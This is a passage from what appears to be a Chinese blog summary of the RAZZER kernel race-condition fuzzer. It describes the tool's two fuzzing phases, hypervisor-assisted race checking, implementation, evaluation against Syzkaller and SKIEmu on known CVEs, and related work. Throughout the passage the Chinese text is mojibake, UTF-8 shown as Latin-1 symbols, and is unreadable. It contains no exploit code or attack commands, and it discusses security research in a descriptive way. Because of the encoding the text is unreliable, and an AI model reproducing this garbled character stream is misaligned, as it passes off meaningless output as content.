é€šè¿‡ä¸¤ä¸ªé˜¶æ®µçš„Fuzzæ¥å‘ç°ç«äº‰æ¼æ´"></a>C. é€šè¿‡ä¸¤ä¸ªé˜¶æ®µçš„Fuzzæ¥å‘ç°ç«äº‰æ¼æ´</h3><p>RAZZERçš„æ¨¡ç³Šæµ‹è¯•åˆ†ä¸¤ä¸ªé˜¶æ®µè¿›è¡Œï¼š<br>ï¼ˆiï¼‰å•çº¿ç¨‹æ¨¡ç³Šæµ‹è¯•é˜¶æ®µæ‰¾åˆ°ä¸€ä¸ªè§¦å‘ä»»ä½•RacePaircandçš„å•çº¿ç¨‹ç”¨æˆ·ç¨‹åº;<br>ï¼ˆiiï¼‰å¤šçº¿ç¨‹æ¨¡ç³Šæµ‹è¯•é˜¶æ®µæœ€ç»ˆæ‰¾åˆ°ä¸€ä¸ªå¤šçº¿ç¨‹ç”¨æˆ·ç¨‹åºï¼Œè¯¥ç¨‹åºæ ¹æ®å•çº¿ç¨‹é˜¶æ®µçš„ç»“æœè§¦å‘ä¸€æ¬¡æ”»å‡»ç«äº‰ã€‚<br>è¦æ³¨æ„æ¯ä¸ªæ¨¡ç³Šæµ‹è¯•é˜¶æ®µç”±ä¸¤ä¸ªç»„ä»¶ç»„æˆï¼Œå³ç”Ÿæˆå™¨å’Œæ‰§è¡Œå™¨ï¼Œå…¶ä¸­ç”Ÿæˆå™¨åˆ›å»ºç”¨æˆ·ç¨‹åºï¼Œç„¶åæ‰§è¡Œç¨‹åºè¿è¡Œç¨‹åºã€‚</p><p>1ï¼‰å•çº¿ç¨‹æ¨¡ç³Šæµ‹è¯•ï¼šåœ¨è¿™ä¸ªé˜¶æ®µï¼Œå•çº¿ç¨‹ç”Ÿæˆå™¨æœ€åˆç”ŸæˆPstï¼Œä¸€ä¸ªå¸¦æœ‰ä¸€ç³»åˆ—éšæœºç³»ç»Ÿè°ƒç”¨çš„å•çº¿ç¨‹ç¨‹åºã€‚ æ¥ä¸‹æ¥ï¼Œå•çº¿ç¨‹æ‰§è¡Œç¨‹åºè¿è¡Œæ¯ä¸ªPstï¼ŒåŒæ—¶æµ‹è¯•Pstçš„æ¯æ¬¡æ‰§è¡Œæ˜¯å¦ä¼šè¦†ç›–RacePaircandã€‚å¦‚æœè¦†ç›–ï¼Œåˆ™å•çº¿ç¨‹æ‰§è¡Œç¨‹åºå°†Pstï¼ˆå¸¦æœ‰è¢«è¦†ç›–RacePaircandçš„ä¿¡æ¯æ³¨é‡Šï¼‰ä¼ é€’ç»™ä¸‹ä¸€é˜¶æ®µæ¥è¿›è¡Œå¤šçº¿ç¨‹æ¨¡ç³Šæµ‹è¯•ã€‚</p><p><strong>å•çº¿ç¨‹ç”Ÿæˆå™¨</strong> å•çº¿ç¨‹ç”Ÿæˆå™¨æ„é€ ä¸€ä¸ªå•çº¿ç¨‹ç”¨æˆ·ç¨‹åºï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸ºPstï¼‰ï¼Œæ‰§è¡Œä¸€ç³»åˆ—éšæœºç³»ç»Ÿè°ƒç”¨æ¥æµ‹è¯•å†…æ ¸çš„è¡Œä¸ºã€‚ RAZZERä½¿ç”¨ä»¥ä¸‹ä¸¤ç§ç­–ç•¥æ„å»ºPstï¼šç”Ÿæˆå’Œå˜å¼‚ã€‚ ä½¿ç”¨ç”Ÿæˆç­–ç•¥æ—¶ï¼ŒRAZZERä¼šæ ¹æ®é¢„å®šä¹‰çš„ç³»ç»Ÿè°ƒç”¨è¯­æ³•éšæœºç”ŸæˆPstã€‚ æ­¤ç³»ç»Ÿè°ƒç”¨è¯­æ³•åŒ…æ‹¬æ‰€æœ‰å¯ç”¨çš„ç³»ç»Ÿè°ƒç”¨ä»¥åŠæ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„ä¸€ç³»åˆ—åˆç†å‚æ•°å€¼ã€‚ éµå¾ªæ­¤è¯­æ³•ï¼ŒRAZZERå°è¯•é€šè¿‡éšæœºé€‰æ‹©ä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨æ¥æ„å»ºåˆç†çš„ç”¨æˆ·ç¨‹åºã€‚ ç„¶åå®ƒéšæœºå¡«å……æ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼Œå¹¶å°†å…¶è¿”å›å€¼éšæœºåœ°æå¸¦åˆ°è·Ÿéšç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ä¸Šã€‚ä¸ç”Ÿæˆç›¸åï¼Œçªå˜éšæœºæ”¹å˜ç°æœ‰çš„Pstã€‚ å®ƒå¯èƒ½ä¼šéšæœºä¸¢å¼ƒPstä¸­çš„ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼Œæ’å…¥æ–°çš„ç³»ç»Ÿè°ƒç”¨æˆ–æ›´æ”¹æŸäº›å‚æ•°å€¼ã€‚</p><p><strong>å•çº¿ç¨‹æ‰§è¡Œç¨‹åº</strong> ç»™å®šæ¥è‡ªç”Ÿæˆå™¨çš„Pstï¼Œå•çº¿ç¨‹æ‰§è¡Œå™¨åœ¨æ‰§è¡Œä»¥ä¸‹ä¸¤ä¸ªä»»åŠ¡æ—¶è¿è¡Œæ¯ä¸ªPstã€‚ é¦–å…ˆï¼Œå¦‚æœPstçš„æ‰§è¡Œè¦†ç›–ä»»ä½•RacePaircandä¸­çš„ä¸¤ä¸ªå­˜å‚¨å™¨è®¿é—®æŒ‡ä»¤ï¼Œåˆ™RAZZERå°†è¿™æ ·åŒ¹é…çš„RacePaircandä¿¡æ¯æ³¨é‡Šåˆ°Pstã€‚ ç„¶åRAZZERå°†è¿™ä¸ªå¸¦æ³¨é‡Šçš„Pstä¼ é€’ç»™å¤šçº¿ç¨‹ç”Ÿæˆå™¨ï¼Œä»¥ä¾¿å¯ä»¥è¿›ä¸€æ­¥æ£€æŸ¥å®ƒæ˜¯å¦æ­£åœ¨ç«äº‰ã€‚</p><p>2ï¼‰å¤šçº¿ç¨‹æ¨¡ç³Šæµ‹è¯•ï¼šåœ¨å•çº¿ç¨‹æ¨¡ç³Šæµ‹è¯•é˜¶æ®µåï¼ŒRAZZERè¿›å…¥å¤šçº¿ç¨‹æ¨¡ç³Šæµ‹è¯•é˜¶æ®µã€‚ å¯¹äºæ¯ä¸ªRacePaircandï¼Œå¤šçº¿ç¨‹ç”Ÿæˆå™¨å°†Pstè½¬æ¢ä¸ºPmtï¼ŒPstçš„å¤šçº¿ç¨‹ç‰ˆæœ¬ã€‚ Pmtè¿˜é…å¤‡äº†ç®¡ç†ç¨‹åºè°ƒç”¨ï¼Œä»¥åœ¨ç»™å®šçš„RacePaircandä¸Šç¡®å®šæ€§åœ°è§¦å‘ç«äº‰ã€‚ æœ€åï¼Œå¤šçº¿ç¨‹æ‰§è¡Œç¨‹åºè¿è¡Œæ¯ä¸ªPmtã€‚ å¦‚æœPmtè¢«ç¡®è®¤ä¸ºç”±ç®¡ç†ç¨‹åºè§¦å‘ç«äº‰ï¼Œåˆ™RAZZERå°†ç›¸åº”çš„RacePaircandæå‡ä¸ºRacePairtrueï¼Œå¹¶é€šè¿‡å°†å…¶åé¦ˆç»™ç”Ÿæˆå™¨æ¥ç»§ç»­æ”¹å˜Pmtã€‚ æ­¤å¤–ï¼Œå¦‚æœPmtèƒ½å¤Ÿè§¦å‘å†…æ ¸å´©æºƒï¼ŒRAZZERåˆ™ä¼šç”Ÿæˆä¸€ä»½æœ‰å…³å·²è¯†åˆ«çš„æœ‰å®³ç«äº‰çš„è¯¦ç»†æŠ¥å‘Šã€‚</p><p><strong>å¤šçº¿ç¨‹ç”Ÿæˆå™¨</strong> å¤šçº¿ç¨‹ç”Ÿæˆå™¨ä½¿ç”¨å¸¦æ³¨é‡Šçš„Pstï¼ˆåŒ…æ‹¬RacePaircandï¼‰ä½œä¸ºè¾“å…¥ã€‚ ç„¶åè¾“å‡ºPmtï¼Œä¹Ÿå°±æ˜¯Pstçš„å¤šçº¿ç¨‹ç‰ˆæœ¬ï¼ŒåŒæ—¶è¾“å…¥å¸¦æ³¨é‡Šçš„RacePaircandä¿¡æ¯åˆ©ç”¨è¶…çº§è°ƒç”¨ç¡®å®šæ€§åœ°è§¦å‘ç«äº‰ã€‚ç”±Pstè½¬æ¢ä¸ºPmtçš„ç¨‹åºå¦‚å›¾4æ‰€ç¤º</p><p><img src="https://i.loli.net/2019/06/30/5d18b602c5d8827167.png" alt="4D28506F-9E98-4E29-9524-FA4A34DC6591.png"></p><p>å›¾5ï¼šRAZZERçš„å¤šçº¿ç¨‹ç”Ÿæˆå™¨ç®—æ³•</p><p>å½“Pmtä¸­çš„RacePaircandæŒ‡ä»¤éƒ½è§¦å‘æ–­ç‚¹æ—¶ï¼ŒRazzerä¼šæ£€æŸ¥è®¿å­˜æŒ‡ä»¤çš„è®¿é—®åœ°å€æ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒï¼Œåˆ™åˆ¤å®šä¸ºRacePairtrueã€‚å¯ä»¥æ³¨æ„åˆ°åœ¨Pmtçš„æœ€ååŠ å…¥äº†ä¸€äº›éšæœºçš„syscallï¼Œè¿™æ˜¯ä¸ºäº†å½“æ•°æ®ç«äº‰é€ æˆäº†å…·æœ‰æ”»å‡»æ•ˆæœçš„åæœæ—¶ï¼Œè®©ç¨‹åºæŠ¥é”™ã€‚æ¯å½“æ£€æµ‹åˆ°ä¸€ä¸ªRacePairtrueï¼Œå°±ä¼šæŠŠç»“æœåé¦ˆå›ç”Ÿæˆç®—æ³•ï¼Œå¹¶ä¿æŒå‰é¢çš„ä»£ç ä¸å˜ï¼Œåªä¿®æ”¹åç»­éšæœºæ·»åŠ çš„syscallï¼Œè¿›è¡Œæ–°çš„Fuzzã€‚å¦‚æœå…¶ä¸­æŸä¸ªPmtä½¿kernelæŠ¥é”™ï¼Œåˆ™è®¤ä¸ºæ˜¯å‘ç°äº†ä¸€ä¸ªRacePairharmã€‚</p><p><strong>å¤šçº¿ç¨‹æ‰§è¡Œç¨‹åº</strong> å¤šçº¿ç¨‹æ‰§è¡Œç¨‹åºçš„ä¸»è¦ä½œç”¨æ˜¯è¿è¡ŒPmtä»¥æµ‹è¯•RacePaircandæ˜¯å¦çœŸæ­£è§¦å‘äº†ç«äº‰ã€‚ åœ¨è¿è¡Œæ—¶ï¼Œå®ƒä¼šåœ¨è°ƒç”¨ç›¸åº”çš„racyç³»ç»Ÿè°ƒç”¨ä¹‹å‰ï¼Œåˆ©ç”¨è¶…çº§è°ƒç”¨åœ¨RacePaircandæŒ‡ä»¤ä¸­è®¾ç½®æ¯æ ¸æ–­ç‚¹ã€‚ ç„¶åï¼Œhcall_check_race()é€šè¿‡åŒæ—¶æ£€æŸ¥ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶æ¥ç¡®å®šæ˜¯å¦çœŸæ­£è§¦å‘äº†ç«äº‰ï¼š<br>ï¼ˆ1ï¼‰å¦‚æœç®¡ç†ç¨‹åºç¡®å®æ•è·äº†ä¸¤ä¸ªæ–­ç‚¹ï¼›<br>ï¼ˆ2ï¼‰RacePaircandæŒ‡ä»¤è®¿é—®çš„å…·ä½“å†…å­˜åœ°å€æ˜¯ç›¸åŒçš„ã€‚</p><p>è¦æ³¨æ„å¼•èµ·çœŸæ­£çš„ç«äº‰æœ¬èº«å¹¶ä¸ä¸€å®šæ„å‘³ç€æœ‰å®³çš„ç«äº‰ï¼ŒRAZZERä¼šåœ¨ç«äº‰åè§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼Œä»¥ä¾¿ä»å„ç§ç«äº‰ä¸­è¾¨åˆ«å‡ºæœ‰å®³çš„ç«äº‰ã€‚ å¤§å¤šæ•°ç°ä»£å†…æ ¸ä½¿ç”¨è¿è¡Œæ—¶ç«äº‰æ£€æµ‹æœºåˆ¶æ¥æ£€æŸ¥æ˜¯å¦å‘ç”Ÿäº†æœ‰å®³ç«äº‰ã€‚ ä¾‹å¦‚ï¼ŒLinuxå†…æ ¸ä½¿ç”¨å„ç§åŠ¨æ€æŠ€æœ¯æ¥æ£€æµ‹æœ‰å®³çš„ç«äº‰ã€‚ ç¤ºä¾‹æ˜¯lockdep[6]ï¼ŒKASAN [7]æˆ–ç”±å†…æ ¸å¼€å‘äººå‘˜æ‰‹åŠ¨æ’å…¥çš„æ–­è¨€ã€‚ æˆ‘ä»¬åœ¨æ„å»ºå†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å¯ç”¨äº†æ‰€æœ‰è¿™äº›æŠ€æœ¯ï¼Œä»¥ä¾¿RAZZERå¯ä»¥åˆ©ç”¨è¿™ç§å¢å¼ºçš„ç«äº‰æ£€æµ‹åŠŸèƒ½ã€‚</p><p>RAZZERçš„ä¸€ä¸ªé‡è¦ç‰¹å¾æ˜¯å®ƒå‘Pmtä¸Šçš„å¤šçº¿ç¨‹ç”Ÿæˆå™¨æä¾›åé¦ˆï¼Œå¯¼è‡´çœŸæ­£çš„ç«äº‰ï¼ˆå³ä½¿æ˜¯è‰¯æ€§ç«äº‰ï¼‰ï¼Œè¿™æ ·Pmtå¯ä»¥è¿›ä¸€æ­¥å˜å¼‚ï¼Œä½†ä»…é™äºä¸ç«äº‰åè¡Œä¸ºç›¸å…³çš„éƒ¨åˆ†ã€‚</p><h3 id="D-å®ç°"><a href="#D-å®ç°" class="headerlink" title="D. å®ç°"></a>D. å®ç°</h3><ol><li>RAZZERçš„é™æ€åˆ†æåŸºäºLLVM 4.0.0å’ŒSVF[8]ã€‚</li><li>RAZZERçš„è™šæ‹Ÿæœºç®¡ç†ç¨‹åºåœ¨QEMU 2.5.0ä¸Šå®ç°ï¼Œå¹¶åˆ©ç”¨KVMï¼ˆåŸºäºå†…æ ¸çš„è™šæ‹Ÿæœºï¼‰æ¥åˆ©ç”¨ç¡¬ä»¶åŠ é€Ÿã€‚</li><li>RAZZERçš„æ¨¡ç³Šå™¨æ˜¯åŸºäºSyzkaller[9]å®ç°çš„ã€‚</li></ol><h2 id="IV-è¯„ä¼°"><a href="#IV-è¯„ä¼°" class="headerlink" title="IV. è¯„ä¼°"></a>IV. è¯„ä¼°</h2><p>åœ¨è¯„ä¼°ä¹‹å‰é¦–å…ˆè¦å‡†å¤‡å¥½ç›®æ ‡å†…æ ¸ï¼ŒRAZZERä¸éœ€è¦æ‰‹åŠ¨ä¿®æ”¹è¦åˆ†æçš„ç›®æ ‡å†…æ ¸ï¼Œå®ƒåªéœ€è¦å…ˆä½¿ç”¨LLVMå’ŒGCCå¯¹ç›®æ ‡è¿›è¡Œbuildï¼Œä¹‹åè¿è¡Œåœ¨RAZZERçš„hypervisorè™šæ‹Ÿæœºä¸Šå³å¯ã€‚</p><ol><li>å›¾5æ€»ç»“äº†RAZZERç¡®å®šçš„ç«äº‰æ¼æ´ã€‚</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b61b13acd91907.png" alt="60EEAB57-10C6-45BB-BCCA-7A14B2528780.png"></p><p>å›¾5ï¼šRAZZERæ–°å‘ç°å¯ä»¥é€ æˆå®‰å…¨ç¼ºé™·çš„ç«äº‰æ¼æ´æ¸…å•</p><ol start="2"><li>å›¾6å±•ç¤ºäº†RAZZERå‘ç°æ–°çš„æœ‰å®³ç«äº‰çš„æ•ˆç‡ã€‚åœ¨è¿™ä¸ªå›¾ä¸­ï¼Œä¸»è¦æç»˜äº†ä¸¤ç±»bugï¼šï¼ˆiï¼‰é€šè¿‡å•çº¿ç¨‹æ¨¡ç³Šæµ‹è¯•å‘ç°çš„éç«äº‰bug; ï¼ˆiiï¼‰é€šè¿‡å¤šçº¿ç¨‹æ¨¡ç³Šæµ‹è¯•å‘ç°çš„ç«äº‰bugã€‚</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b62f4991954310.png" alt="80335BF3-5851-4D38-A49C-751272C623E7.png"></p><p>å›¾7ï¼šéšæ—¶é—´å˜åŒ–çš„å”¯ä¸€å´©æºƒæ¬¡æ•°</p><ol start="3"><li>ä¸ºäº†è¯æ˜RAZZERåˆ†åŒºåˆ†æçš„æœ‰æ•ˆæ€§ï¼Œä½œè€…æµ‹é‡äº†ä»æ•´ä¸ªå†…æ ¸è·å–æ‰€æœ‰RacePairscandæ‰€éœ€çš„æ—¶é—´ï¼Œå¦‚å›¾8æ‰€ç¤ºã€‚</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b6444f5a458116.png" alt="8D7C37A3-6D05-4F8A-A2F5-CAEC90794E3A.png"></p><p>å›¾8ï¼šRAZZERé™æ€åˆ†æçš„æ€§èƒ½</p><ol start="4"><li>é‰´äºRAZZERåˆ©ç”¨è¶…çº§è°ƒç”¨æ¥å¯ç”¨vCPUçš„ç¡®å®šæ€§è¡Œä¸ºï¼Œå› æ­¤éœ€è¦é¢å¤–çš„å¼€é”€æ¥ä¸ç®¡ç†ç¨‹åºè¿›è¡Œé€šä¿¡ã€‚ä¸ºäº†äº†è§£ç”±äºç®¡ç†ç¨‹åºå¼•èµ·çš„å¼€é”€ï¼Œæµ‹é‡äº†æ¯æ¬¡è¶…çº§è°ƒç”¨çš„ç»è¿‡æ—¶é—´100Mæ¬¡å¹¶è®¡ç®—äº†å¹³å‡å€¼ã€‚å›¾9æ˜¾ç¤ºäº†RAZZERçš„è¶…çº§è°ƒç”¨çš„æ€§èƒ½å¼€é”€ã€‚</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b6566afad24683.png" alt="BC14696C-9949-4936-BB5B-E5C7487E06C2.png"></p><p>å›¾9ï¼šæ‰§è¡ŒRAZZERçš„è¶…çº§è°ƒç”¨æ—¶çš„æ€§èƒ½å¼€é”€</p><ol start="5"><li>æ¨¡ç³Šæµ‹è¯•çš„æ‰§è¡Œååé‡å¯èƒ½æ˜¯æ¨¡ç³ŠæŠ€æœ¯æ•ˆç‡çš„é—´æ¥æµ‹é‡ï¼Œä½†æ›´ç›´æ¥å’Œé‡è¦çš„æµ‹é‡åº”è¯¥æ˜¯æ‰¾åˆ°bugæ‰€éœ€çš„æ—¶é—´ï¼ˆå³æœ¬æ–‡ä¸­çš„æœ‰å®³ç«äº‰ï¼‰ã€‚ ä¸ºäº†è¯æ˜è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æµ‹é‡äº†å‘ç°ä»¥å‰å·²çŸ¥çš„æœ‰å®³ç«äº‰CVE-2017-2636ï¼ŒCVE-2016-8655å’ŒCVE2017-17712æ‰€éœ€çš„æ‰§è¡Œæ¬¡æ•°ï¼ŒåŒæ—¶è¿è¡Œäº†10ä¸ªå°æ—¶ã€‚å¦‚å›¾10æ‰€ç¤ºï¼ŒRAZZERå‘ç°æ‰€æœ‰è¿™äº›ä»¥å‰å·²çŸ¥çš„ç«äº‰å…·æœ‰åˆç†çš„æ‰§è¡Œæ¬¡æ•°ï¼ˆå³ä»246 Kåˆ°1,170 Kï¼‰ä»¥åŠåœ¨åˆç†çš„æ—¶é—´å†…ï¼ˆå³ä»7åˆ†é’Ÿåˆ°26åˆ†é’Ÿï¼‰ã€‚ ç„¶è€Œï¼ŒSyzkalleræœªèƒ½æ‰¾åˆ°æ‰€æœ‰è¿™äº›æ¡ˆä¾‹ï¼Œå°½ç®¡åœ¨10å°æ—¶å†…ä»5 Måˆ°37 Mç”Ÿæˆ/çªå˜ç¨‹åºæ‰§è¡Œã€‚ ç‰¹åˆ«æ˜¯åŸºäºè¿™äº›CVEæ¡ˆä¾‹ï¼Œè¡¨æ˜RAZZERæ¯”Syzkalleræ›´å¿«ï¼Œè‡³å°‘ä¸º23è‡³85å€ã€‚</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b66b3b52350327.png" alt="21F6932C-A538-4609-B7E9-C3977510B3B7.png"></p><p>å›¾10ï¼šSyzkallerå’ŒRAZZERåœ¨æŸ¥æ‰¾è§¦å‘ç«äº‰çš„ç”¨æˆ·ç¨‹åºæ—¶çš„æ•ˆç‡ã€‚ ä½œè€…æµ‹é‡äº†æ‰§è¡Œæ€»æ¬¡æ•°å’Œæ‰¾åˆ°ä¹‹å‰å·²çŸ¥ç«äº‰æ‰€éœ€çš„æ—¶é—´ã€‚ RAZZERåœ¨åˆç†çš„æ—¶é—´å†…æ‰¾åˆ°äº†æ‰€æœ‰å·²çŸ¥çš„ç«äº‰ï¼Œè€ŒSyzkalleråœ¨10å°æ—¶çš„ç»™å®šæ—¶é—´å†…æ²¡æœ‰å‘ç°ä»»ä½•ç«äº‰ï¼ˆv4.8ï¼‰ã€‚</p><ol start="6"><li>å›¾11æ˜¾ç¤ºäº†åœ¨è¿è¡ŒRAZZERå’ŒSKIEmuæ—¶è§¦å‘æ¯ä¸ªç«äº‰æ‰€éœ€çš„æ‰§è¡Œæ¬¡æ•°ã€‚ ç”±äºRAZZERä»…æ¢ç´¢ä¸RacePairscandç›¸å…³çš„çº¿ç¨‹äº¤é”™ï¼ˆé€šè¿‡è¿è¡Œç»™å®šçš„ç”¨æˆ·ç¨‹åºå‘ç°ï¼‰ï¼Œå› æ­¤æ¢ç´¢çš„çº¿ç¨‹äº¤é”™æƒ…å†µè¦å°‘å¾—å¤šï¼ŒRAZZERæ‰€éœ€çš„æ‰§è¡Œæ¬¡æ•°è¿œå°‘äºSKIEmuï¼ŒèŒƒå›´ä»30æ¬¡å‡å°‘åˆ°398æ¬¡ã€‚ è¿™ä¸ªç»“æœè¿˜è¡¨æ˜ï¼ŒSKIEmuæ¢ç´¢çš„è®¸å¤šçº¿ç¨‹äº¤é”™æ¡ˆä¾‹ä¸ç«äº‰æ— å…³ï¼Œè¿™æ ‡å¿—ç€RAZZERåœ¨æ»¡è¶³R2æ–¹é¢çš„æœ‰æ•ˆæ€§ã€‚</li></ol><p><img src="https://i.loli.net/2019/06/30/5d18b67e85ebe59307.png" alt="90A08220-0F1A-4C50-81A8-5B4F79A34399.png"></p><p>å›¾11ï¼šSKIEmuå’ŒRAZZERåœ¨æ­ç¤ºè§¦å‘ç«äº‰çš„çº¿ç¨‹äº¤é”™æ–¹é¢çš„æ•ˆç‡ã€‚ Foundåˆ—æ˜¾ç¤ºäº†æŸ¥æ‰¾äº¤é”™æ‰€éœ€çš„æ‰§è¡Œæ¬¡æ•°ï¼ˆé€šè¿‡é‡å¤å®éªŒ5æ¬¡å¹¶è®¡ç®—å¹³å‡å€¼è·å¾—ï¼‰ï¼ŒTotalåˆ—æ˜¾ç¤ºæ¯ä¸ªå·¥å…·æ‰€éœ€çš„ç†è®ºæœ€å¤§æ‰§è¡Œæ¬¡æ•°ï¼ˆv4.8ï¼‰ã€‚</p><h2 id="V-ç›¸å…³å·¥ä½œ"><a href="#V-ç›¸å…³å·¥ä½œ" class="headerlink" title="V. ç›¸å…³å·¥ä½œ"></a>V. ç›¸å…³å·¥ä½œ</h2><p>é¢å‘å†…æ ¸çš„Fuzzingæµ‹è¯•çš„ä¸»è¦æ€æƒ³æ˜¯é€šè¿‡ç»™å†…æ ¸é©±åŠ¨è¾“å…¥å¤§é‡ç•¸å½¢æ•°æ®ï¼Œè§‚å¯Ÿæ“ä½œç³»ç»Ÿå¯¹è¿™äº›ç•¸å½¢æ•°æ®å¤„ç†åçš„ååº”ï¼Œå¦‚æœå‡ºç°äº†è“å±æˆ–è€…å´©æºƒç­‰ä¿¡æ¯ï¼Œåˆ™å†å¯¹dumpä¿¡æ¯è¿›è¡Œé™æ€åˆ†æå®šä½æ¼æ´[10]ã€‚è¿™ç±»å·¥å…·å¦‚IOCTLã€Syzkallerç­‰ã€‚æ­¤èŠ‚å°†ä¸»è¦ä»‹ç»é‚£äº›èƒ½å¤Ÿè¯†åˆ«ï¼ˆæˆ–ååŠ©è¯†åˆ«ï¼‰æ•°æ®ç«äº‰çš„æŠ€æœ¯ã€‚</p><p><strong>åŠ¨æ€æ¨¡ç³Šæµ‹è¯•</strong> æœ€è¿‘çš„è®¸å¤šç ”ç©¶è¡¨æ˜ï¼Œæ¨¡ç³Šæµ‹è¯•æ˜¯ä¸€ç§å¾ˆæœ‰å‰é€”çš„æŠ€æœ¯ï¼Œç”¨äºå‘ç°ç”¨æˆ·ç¨‹åºä¸­[11]å’Œå†…æ ¸[12]çš„bugã€‚ æ¨¡ç³Šæµ‹è¯•çš„å…³é”®ä¼˜åŠ¿ä¸ä»…åœ¨äºè¯¥æ–¹æ³•å¯ä»¥æœ‰æ•ˆåœ°å‘ç°ç›®æ ‡ç¨‹åºä¸­çš„bugï¼Œè€Œä¸”è¿˜å¯ä»¥é¿å…è¯¯æŠ¥ï¼Œå› ä¸ºå®ƒä¼šäº§ç”Ÿå†ç°bugçš„è¾“å…¥ã€‚ ç„¶è€Œï¼Œæ®æˆ‘ä»¬æ‰€çŸ¥ï¼Œæ‰€æœ‰æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯åœ¨ç”¨äºè¯†åˆ«ç«äº‰bugæ—¶æ•ˆç‡ä½ä¸‹ï¼Œä¸»è¦æ˜¯å› ä¸ºä»–ä»¬çš„è®¾è®¡ä¸é€‚åˆç«äº‰ã€‚ è™½ç„¶å¤§å¤šæ•°æ¨¡ç³Šå™¨ä¸“æ³¨äºåˆ©ç”¨å…ˆå‰æ¢ç´¢çš„æ‰§è¡Œè¦†ç›–ï¼Œä½†ä»–ä»¬ä¸è€ƒè™‘çº¿ç¨‹äº¤é”™ã€‚ ä¸è¿™äº›ç›¸æ¯”ï¼Œæœ¬æ–‡ä»‹ç»çš„RAZZERåˆ™ç»¼åˆè€ƒè™‘äº†æ‰§è¡Œè¦†ç›–å’Œçº¿ç¨‹äº¤é”™ä»è€Œæ›´æœ‰æ•ˆåœ°å‘ç°æ•°æ®ç«äº‰ã€‚</p><p><strong>åŠ¨æ€çº¿ç¨‹è°ƒåº¦ç¨‹åº</strong> ä¸€äº›ç ”ç©¶ä¾‹å¦‚è¯•å›¾é€šè¿‡å®ç°éšæœºåŒ–æ¯çº¿ç¨‹æ‰§è¡Œè°ƒåº¦çš„å®šåˆ¶çº¿ç¨‹è°ƒåº¦å™¨æ¥æ‰¾åˆ°å¼•èµ·ç«äº‰çš„çº¿ç¨‹äº¤é”™çš„å®ä¾‹ã€‚ ç‰¹åˆ«æ˜¯ï¼ŒPCTç®—æ³•[13]å’ŒSKI [4]é€šè¿‡æ¢ç´¢æ‰€æœ‰å¯èƒ½çš„çº¿ç¨‹äº¤é”™æƒ…å†µæ¥å‘ç°ç”¨æˆ·ç¨‹åºæˆ–å†…æ ¸ä¸­çš„ç«äº‰ã€‚ è¿™ä¸¤ç§æ–¹æ³•çš„å±€é™æ€§æ˜¯ï¼šï¼ˆiï¼‰ä»–ä»¬ä¸ç”Ÿæˆï¼ˆæˆ–æ”¹å˜ï¼‰è¾“å…¥ç¨‹åºï¼Œå› æ­¤å®ƒæ‰¾ä¸åˆ°è§¦å‘æ•°æ®ç«äº‰çš„æ–°ç¨‹åº; ï¼ˆiiï¼‰å®ƒä»¬æ— æ³•æ‰¾åˆ°åŒæ—¶æ‰§è¡ŒRacePaircandçš„è¾“å…¥ç¨‹åºçš„çº¿ç¨‹äº¤é”™ï¼Œå› ä¸ºå®ƒä»¬å¿…é¡»æœç´¢æ‰€æœ‰å¯èƒ½çš„çº¿ç¨‹äº¤é”™æƒ…å†µçš„éå¸¸å¤§çš„ç©ºé—´ã€‚ äº‹å®ä¸Šï¼ŒRAZZERçš„è®¾è®¡çµæ„Ÿæ¥è‡ªPCTç®—æ³•å’ŒSKIå®ƒé€šè¿‡å®šåˆ¶æ¨¡ç³Šè¿‡ç¨‹æ¥æ»¡è¶³R1ï¼ŒåŒæ—¶é€šè¿‡å¯¹RacePairscandè¿›è¡Œä¼˜å…ˆæœç´¢æ¥æœ‰æ•ˆåœ°æ»¡è¶³R2ã€‚</p><p><strong>åŠ¨æ€ç«äº‰æ£€æµ‹å™¨</strong> è®¸å¤šç ”ç©¶[14]è¯•å›¾é€šè¿‡æ”¶é›†å…³äºç«äº‰çš„ä¸°å¯Œçš„ä¸Šä¸‹æ–‡ä¿¡æ¯æ¥æ”¹å–„è¿è¡Œæ—¶çš„ç«äº‰æ£€æµ‹èƒ½åŠ›ã€‚ è¿™äº›åŸºæœ¬ä¸Šä¸RAZZERæ­£äº¤ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»¬ä¸RAZZERä¸€èµ·éƒ¨ç½²åï¼ŒRAZZERçš„ç«äº‰æ£€æµ‹èƒ½åŠ›ä¹Ÿå¯ä»¥å¾—åˆ°å¢å¼ºã€‚</p><p>ç‰¹åˆ«æ˜¯ï¼ŒThreadSanitizer [15]æ˜¯ç”±è°·æ­Œå¼€å‘çš„ä¼ä¸šçº§ç«äº‰æ£€æµ‹å™¨ï¼Œæœ€è¿‘ä¹Ÿåº”ç”¨åœ¨äº†Linuxå†…æ ¸å‘å¸ƒä¹‹å‰çš„æ£€æµ‹ã€‚ ä¸ºäº†åœ¨æ£€æµ‹ç«äº‰æ—¶å¢å¼ºæ€§èƒ½ï¼ŒTxRace [16]åˆ©ç”¨ç¡¬ä»¶äº‹åŠ¡å­˜å‚¨å™¨ï¼ŒProRace [17]åˆ©ç”¨æ€§èƒ½ç›‘æ§å•å…ƒã€‚ å­˜å‚¨å™¨é‡‡æ ·æŠ€æœ¯æœ‰é€‰æ‹©åœ°ç›‘è§†å­˜å‚¨å™¨è®¿é—®ä»¥ä¼˜åŒ–æ€§èƒ½ã€‚ RaceMob [18]ä»é™æ€åˆ†æç”Ÿæˆçš„æ½œåœ¨æ•°æ®ç«äº‰ä¸­ä¼—åŒ…è¿è¡Œæ—¶ç«äº‰æµ‹è¯•ã€‚ Snorlax 